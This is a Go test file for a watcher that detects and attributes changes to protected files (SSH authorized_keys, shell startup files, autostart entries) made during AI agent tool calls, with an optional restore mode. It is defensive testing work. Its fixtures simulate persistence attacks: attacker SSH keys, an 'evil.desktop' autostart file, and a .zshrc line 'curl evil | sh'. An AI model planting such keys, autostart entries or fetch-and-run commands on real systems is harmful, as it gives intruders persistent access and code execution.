// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// SPDX-License-Identifier: Apache-2.0

package protectedfiles

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

type clock struct{ t time.Time }

func (c *clock) now() time.Time       { return c.t }
func (c *clock) tick(d time.Duration) { c.t = c.t.Add(d) }

type fixture struct {
	t       *testing.T
	home    string
	state   string
	clock   *clock
	act     *Activity
	w       *Watcher
	changes []Change
}

func newFixture(t *testing.T, restore bool) *fixture {
	t.Helper()
	f := &fixture{t: t, home: t.TempDir(), state: t.TempDir(), clock: &clock{t: time.Unix(1_800_000_000, 0)}}
	if err := os.MkdirAll(filepath.Join(f.home, ".ssh"), 0o700); err != nil {
		t.Fatal(err)
	}
	f.write(".ssh/authorized_keys", "ssh-ed25519 AAAA user@laptop\n")
	f.act = NewActivity(f.clock.now)
	f.start(restore)
	return f
}

func (f *fixture) start(restore bool) {
	f.w = New(Options{Restore: restore, StateDir: f.state, Activity: f.act, Now: f.clock.now,
		Paths: DefaultPaths("linux"), Emit: func(c Change) { f.changes = append(f.changes, c) },
		Restorable: func(string) bool { return true }})
	f.w.AddHome(f.home)
}

func (f *fixture) path(rel string) string { return filepath.Join(f.home, filepath.FromSlash(rel)) }

func (f *fixture) write(rel, content string) {
	f.t.Helper()
	if err := os.WriteFile(f.path(rel), []byte(content), 0o600); err != nil {
		f.t.Fatal(err)
	}
}

func (f *fixture) read(rel string) string {
	data, err := os.ReadFile(f.path(rel))
	if err != nil {
		return "<absent>"
	}
	return string(data)
}

func (f *fixture) scan() []Change {
	f.clock.tick(DefaultInterval)
	f.changes = nil
	f.w.Scan()
	return f.changes
}

var agent = Session{Connector: "claudecode", SessionID: "s1", ToolInvocationID: "t1", AgentIdentityID: "agt-1"}

func TestExistingContentIsTheBaseline(t *testing.T) {
	f := newFixture(t, false)
	if got := f.scan(); len(got) != 0 {
		t.Fatalf("first scan reported %+v", got)
	}
}

// ssh-copy-id run by the user with no agent tool call running is the
// user's own change: recorded, never attributed.
func TestUserChangeOutsideAnAgentCallIsNotAttributed(t *testing.T) {
	f := newFixture(t, false)
	f.write(".ssh/authorized_keys", "ssh-ed25519 AAAA user@laptop\nssh-ed25519 BBBB user@desktop\n")
	got := f.scan()
	if len(got) != 1 || got[0].Attributed || got[0].Class != ClassAuthorizedKeys {
		t.Fatalf("changes = %+v", got)
	}
	if !strings.HasPrefix(got[0].Before, "sha256:") || len(got[0].Before) != len("sha256:")+12 || got[0].Before == got[0].After {
		t.Fatalf("digests %q -> %q", got[0].Before, got[0].After)
	}
	// An agent call that ended well before the change does not claim it.
	f.act.Begin(f.home, agent)
	f.act.End(f.home, agent)
	f.scan()
	f.clock.tick(time.Minute)
	f.scan() // the watch polls every interval
	f.write(".bashrc", "alias ll='ls -l'\n")
	if got := f.scan(); len(got) != 1 || got[0].Attributed || got[0].Class != ClassShellRC {
		t.Fatalf("changes = %+v", got)
	}
}

func TestChangeDuringAnAgentCallNamesTheSession(t *testing.T) {
	f := newFixture(t, false)
	f.act.Begin(f.home, agent)
	f.write(".ssh/authorized_keys", "ssh-ed25519 EVIL attacker\n")
	got := f.scan()
	if len(got) != 1 || !got[0].Attributed || got[0].Session != agent || got[0].Restored {
		t.Fatalf("changes = %+v", got)
	}
	if f.read(".ssh/authorized_keys") != "ssh-ed25519 EVIL attacker\n" {
		t.Fatal("alert mode changed the file")
	}
	// One alert per change: the next scan is quiet.
	if got := f.scan(); len(got) != 0 {
		t.Fatalf("repeat %+v", got)
	}
	// Another user's home is not this agent's.
	other := NewActivity(f.clock.now)
	other.Begin("/home/someone-else", agent)
	if _, ok := other.Attribute(f.home, f.clock.now().Add(-time.Second), f.clock.now()); ok {
		t.Fatal("a call in another home was attributed")
	}
}

// A write that lands just after the call's result is still the call's.
func TestChangeRightAfterTheCallIsAttributed(t *testing.T) {
	f := newFixture(t, false)
	f.act.Begin(f.home, agent)
	f.act.End(f.home, agent)
	f.write(".ssh/authorized_keys", "x\n")
	if got := f.scan(); len(got) != 1 || !got[0].Attributed {
		t.Fatalf("changes = %+v", got)
	}
}

func TestWriteThroughAHardLinkAndRenameOverAreSeen(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("hard links of a temp dir differ on Windows; rename is covered below")
	}
	f := newFixture(t, false)
	other := filepath.Join(f.home, "notes.txt")
	if err := os.Link(f.path(".ssh/authorized_keys"), other); err != nil {
		t.Fatal(err)
	}
	f.act.Begin(f.home, agent)
	if err := os.WriteFile(other, []byte("ssh-ed25519 EVIL via link\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := f.scan(); len(got) != 1 || !got[0].Attributed || got[0].Path != f.path(".ssh/authorized_keys") {
		t.Fatalf("link write: %+v", got)
	}
	tmp := filepath.Join(f.home, "tmp.keys")
	if err := os.WriteFile(tmp, []byte("ssh-ed25519 EVIL via rename\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Rename(tmp, f.path(".ssh/authorized_keys")); err != nil {
		t.Fatal(err)
	}
	if got := f.scan(); len(got) != 1 || !got[0].Attributed {
		t.Fatalf("rename over: %+v", got)
	}
}

func TestReplacedSSHDirectoryIsSeen(t *testing.T) {
	f := newFixture(t, false)
	if err := os.Rename(filepath.Join(f.home, ".ssh"), filepath.Join(f.home, ".ssh.old")); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(f.home, ".ssh"), 0o700); err != nil {
		t.Fatal(err)
	}
	f.act.Begin(f.home, agent)
	f.write(".ssh/authorized_keys", "ssh-ed25519 EVIL\n")
	if got := f.scan(); len(got) != 1 || !got[0].Attributed {
		t.Fatalf("changes = %+v", got)
	}
}

func TestNewAutostartEntryIsSeen(t *testing.T) {
	f := newFixture(t, false)
	dir := f.path(".config/autostart")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	f.act.Begin(f.home, agent)
	if err := os.WriteFile(filepath.Join(dir, "evil.desktop"), []byte("[Desktop Entry]\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	got := f.scan()
	if len(got) != 1 || got[0].Class != ClassAutostart || got[0].Before != "absent" || !got[0].Attributed {
		t.Fatalf("changes = %+v", got)
	}
}

func TestRestoreIsOffUnlessAsked(t *testing.T) {
	f := newFixture(t, false)
	f.act.Begin(f.home, agent)
	f.write(".ssh/authorized_keys", "EVIL\n")
	if got := f.scan(); len(got) != 1 || got[0].Restored || f.read(".ssh/authorized_keys") != "EVIL\n" {
		t.Fatalf("restored without restore mode: %+v", got)
	}
}

func TestRestorePutsBackTheAcceptedContent(t *testing.T) {
	f := newFixture(t, true)
	// The user's own edit becomes the content to restore.
	f.write(".ssh/authorized_keys", "ssh-ed25519 AAAA user@laptop\nssh-ed25519 CCCC user@new\n")
	if got := f.scan(); len(got) != 1 || got[0].Attributed {
		t.Fatalf("user edit %+v", got)
	}
	f.act.Begin(f.home, agent)
	f.write(".ssh/authorized_keys", "EVIL\n")
	got := f.scan()
	if len(got) != 1 || !got[0].Restored || got[0].RestoreError != "" {
		t.Fatalf("restore %+v", got)
	}
	if want := "ssh-ed25519 AAAA user@laptop\nssh-ed25519 CCCC user@new\n"; f.read(".ssh/authorized_keys") != want {
		t.Fatalf("content after restore = %q", f.read(".ssh/authorized_keys"))
	}
	if got := f.scan(); len(got) != 0 {
		t.Fatalf("the restore itself was reported: %+v", got)
	}
	// A file the agent created where none was is removed.
	f.write(".zshrc", "curl evil | sh\n")
	if got := f.scan(); len(got) != 1 || !got[0].Restored || f.read(".zshrc") != "<absent>" {
		t.Fatalf("created file %+v, content %q", got, f.read(".zshrc"))
	}
}

func TestRestoreRefusedWhereNotAllowed(t *testing.T) {
	f := newFixture(t, true)
	f.w.opts.Restorable = func(string) bool { return false }
	f.act.Begin(f.home, agent)
	f.write(".ssh/authorized_keys", "EVIL\n")
	if got := f.scan(); len(got) != 1 || got[0].Restored || got[0].RestoreError == "" {
		t.Fatalf("changes = %+v", got)
	}
}

// A change while the gateway was stopped is reported at the next start,
// unattributed, from the saved digest.
func TestChangeWhileStoppedIsReportedAtStart(t *testing.T) {
	f := newFixture(t, false)
	f.scan()
	f.write(".ssh/authorized_keys", "changed while stopped\n")
	f.start(false)
	got := f.scan()
	if len(got) != 1 || got[0].Attributed {
		t.Fatalf("changes = %+v", got)
	}
	data, err := os.ReadFile(filepath.Join(f.state, stateName))
	if err != nil || strings.Contains(string(data), "changed while stopped") {
		t.Fatalf("state file %q, %v: must hold digests only", data, err)
	}
}

func TestOpenCallsExpire(t *testing.T) {
	c := &clock{t: time.Unix(1_800_000_000, 0)}
	a := NewActivity(c.now)
	a.Begin("/home/u", agent)
	c.tick(maxOpenCall + time.Second)
	if _, ok := a.Attribute("/home/u", c.now().Add(-time.Second), c.now()); ok {
		t.Fatal("a call without a result counted forever")
	}
}

func TestDefaultPathsAndClasses(t *testing.T) {
	for _, goos := range []string{"linux", "darwin", "windows"} {
		paths := DefaultPaths(goos)
		if paths[0] != ".ssh/authorized_keys" {
			t.Fatalf("%s: %v", goos, paths)
		}
		for _, p := range paths {
			if ClassOf(p) == ClassOther {
				t.Fatalf("%s: %s has no class", goos, p)
			}
		}
	}
}
